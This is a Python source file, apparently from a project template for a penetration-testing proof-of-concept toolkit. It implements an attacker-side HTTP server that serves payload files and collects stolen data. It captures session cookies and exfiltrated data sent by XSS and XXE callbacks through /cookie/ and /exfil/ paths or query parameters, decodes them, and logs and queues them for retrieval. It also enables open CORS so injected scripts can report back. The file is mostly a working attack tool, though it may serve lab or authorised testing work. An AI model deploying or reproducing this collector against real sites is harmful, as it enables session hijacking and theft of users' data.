#!/usr/bin/env python3
"""
Simple HTTP server for POC development.

This module provides a lightweight HTTP server that:
- Serves files from the payloads/ directory
- Logs all incoming requests to logs/server.ndjson
- Automatically captures cookies and exfiltrated data
- Provides an event queue accessible via HTTP DELETE /queue

The server supports both query parameters and path parameters for
cookie and exfil data capture:
- Query: /?cookie=data or /?exfil=data
- Path: /cookie/data or /exfil/data
"""

from http.server import SimpleHTTPRequestHandler, HTTPServer
import logging
from datetime import datetime
import json
import base64
from urllib.parse import parse_qs, urlparse, unquote
import os
from queue import Queue
from {{cookiecutter.project_slug}}.utils.network import get_interfaces
from {{cookiecutter.project_slug}}.utils.output import out
from {{cookiecutter.project_slug}}.utils.paths import LOGS_DIR, PAYLOADS_DIR, ensure_dirs_exist, get_log_file

# Ensure directories exist
ensure_dirs_exist()

# Setup logger (only used for internal errors if any)
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger('server')

# Global queue for interesting events
event_queue = Queue()


class POCHTTPHandler(SimpleHTTPRequestHandler):
    """
    HTTP request handler for POC development.

    Extends SimpleHTTPRequestHandler to add:
    - Automatic request logging
    - Cookie capture from query params or path
    - Exfil data capture from query params or path
    - Event queue for interesting captures
    - CORS support for XSS callbacks
    """

    def __init__(self, *args, **kwargs):
        """
        Initialize the handler.

        Automatically sets the serving directory to payloads/.
        """
        # Serve from payloads directory
        super().__init__(*args, directory=str(PAYLOADS_DIR), **kwargs)

    def do_GET(self):
        self.handle_request()
        super().do_GET()

    def do_POST(self):
        """
        Handle POST requests.

        Logs the request and body, then sends a JSON response
        confirming the data was received.
        """
        self.handle_request()

        # Read POST data
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length else b''

        # Send response
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

        response = json.dumps({
            'status': 'logged',
            'received': len(post_data),
            'timestamp': datetime.now().isoformat()
        })
        self.wfile.write(response.encode())

    def do_OPTIONS(self):
        # CORS support
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', '*')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()

    def do_DELETE(self):
        """
        Handle DELETE requests for event queue.

        DELETE /queue pops and returns the next event from the queue.
        Returns 200 with JSON event data if available, 204 if queue is empty.

        Returns:
            JSON with event data: {"type": "cookie", "data": "...", "timestamp": "..."}
            Or 204 No Content if queue is empty
        """
        if self.path == '/queue':
            try:
                event = event_queue.get(timeout=1.0)
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(event).encode())
            except:
                self.send_response(204)  # No content
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def handle_request(self):
        """
        Log request details and capture interesting data.

        Logs all request details to logs/server.ndjson and checks for:
        - Cookies in query (?cookie=) or path (/cookie/)
        - Exfil data in query (?exfil=) or path (/exfil/)

        Captured cookies and exfil data are:
        - Displayed in console with colored output
        - Added to the event queue (accessible via DELETE /queue)
        - Logged to server.ndjson

        Cookie data is automatically base64-decoded if possible.
        Path parameters are URL-decoded automatically.
        """
        parsed = urlparse(self.path)

        # Read body if POST
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length and self.command == 'POST' else b''

        # Parse query params
        query_params = parse_qs(parsed.query) if parsed.query else {}

        # Create log entry
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'client': f"{self.client_address[0]}:{self.client_address[1]}",
            'method': self.command,
            'path': self.path,
            'query': query_params,
            'headers': dict(self.headers),
            'body': base64.b64encode(body).decode() if body else ""
        }

        # Log to file
        with open(get_log_file('server.ndjson'), 'a') as f:
            f.write(json.dumps(log_entry) + '\n')

        # Console output (minimal)
        out.info(f"[{datetime.now().strftime('%H:%M:%S')}] {self.command} {self.path} from {self.client_address[0]}")
        if parsed.query:
            out.debug(f"Query: {parsed.query}")
        if body:
            out.debug(f"Body: {body.decode('utf-8', errors='replace')[:100]}")

        # Check for path parameters first (e.g., /cookie/data or /exfil/data)
        path = parsed.path

        # Check for cookie in path
        if path.startswith('/cookie/'):
            cookie_data = unquote(path[8:])  # Remove '/cookie/' prefix and URL decode
            try:
                decoded_cookie = base64.b64decode(cookie_data).decode('utf-8', errors='replace')
                out.success(f"🍪 COOKIE CAPTURED: {decoded_cookie}")
                event_queue.put({'type': 'cookie', 'data': decoded_cookie, 'raw': cookie_data, 'timestamp': datetime.now().isoformat()})
            except:
                out.success(f"🍪 COOKIE (raw): {cookie_data}")
                event_queue.put({'type': 'cookie', 'data': cookie_data, 'raw': cookie_data, 'timestamp': datetime.now().isoformat()})

        # Check for exfil in path
        elif path.startswith('/exfil/'):
            exfil_data = unquote(path[7:])  # Remove '/exfil/' prefix and URL decode
            out.success(f"📤 EXFIL DATA: {exfil_data[:200]}...")  # Show first 200 chars
            event_queue.put({'type': 'exfil', 'data': exfil_data, 'timestamp': datetime.now().isoformat()})

        # Fall back to checking query parameters
        else:
            # Check for interesting parameters in query and add to queue
            if 'cookie' in query_params:
                cookie_data = query_params['cookie'][0] if query_params['cookie'] else ''
                try:
                    decoded_cookie = base64.b64decode(cookie_data).decode('utf-8', errors='replace')
                    out.success(f"🍪 COOKIE CAPTURED: {decoded_cookie}")
                    event_queue.put({'type': 'cookie', 'data': decoded_cookie, 'raw': cookie_data, 'timestamp': datetime.now().isoformat()})
                except:
                    out.success(f"🍪 COOKIE (raw): {cookie_data}")
                    event_queue.put({'type': 'cookie', 'data': cookie_data, 'raw': cookie_data, 'timestamp': datetime.now().isoformat()})

            # Check for XXE/exfil data
            if 'exfil' in query_params:
                exfil_data = query_params['exfil'][0] if query_params['exfil'] else ''
                out.success(f"📤 EXFIL DATA: {exfil_data[:200]}...")  # Show first 200 chars
                event_queue.put({'type': 'exfil', 'data': exfil_data, 'timestamp': datetime.now().isoformat()})

    def log_message(self, format, *args):
        # Suppress default logging
        pass

    def end_headers(self):
        # Add CORS to all responses
        self.send_header('Access-Control-Allow-Origin', '*')
        super().end_headers()


def main_with_args(args):
    """
    Main entry point called from CLI.

    Starts the HTTP server on the specified host and port.
    Displays all available network interfaces and their IPs.

    Args:
        args: Namespace with bind (str) and port (int) attributes

    The server will:
    - Serve files from payloads/ directory
    - Log all requests to logs/server.ndjson
    - Capture cookies and exfil data automatically
    - Provide event queue at DELETE /queue
    """
    os.chdir(str(PAYLOADS_DIR))  # Serve from payloads directory

    # Queue is now accessed via HTTP DELETE /queue endpoint

    # Get all network interfaces
    interfaces = get_interfaces()

    out.raw(f"\n{'='*50}")
    out.info("POC Server listening on:")

    # Priority order for interfaces to highlight
    priority_interfaces = ['tun0', 'eth0', 'wlan0', 'ens33']

    # Show priority interfaces first
    for iface in priority_interfaces:
        if iface in interfaces:
            out.success(f"→ http://{interfaces[iface]}:{args.port} ({iface})")

    # Show remaining interfaces
    for iface, ip in interfaces.items():
        if iface not in priority_interfaces and not ip.startswith('127.'):
            out.status(f"→ http://{ip}:{args.port} ({iface})")

    # Always show localhost last
    if args.bind == '0.0.0.0':
        out.status(f"→ http://127.0.0.1:{args.port} (localhost)")

    out.raw(f"\nServing: {PAYLOADS_DIR}")
    out.raw(f"Logs: {LOGS_DIR}/server.ndjson")
    out.raw("Queue: DELETE /queue to pop events")
    out.raw(f"{'='*50}\n")

    server = HTTPServer((args.bind, args.port), POCHTTPHandler)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        out.warning("\nShutting down...")
        server.shutdown()


# This server is meant to be called via cli.py, not run directly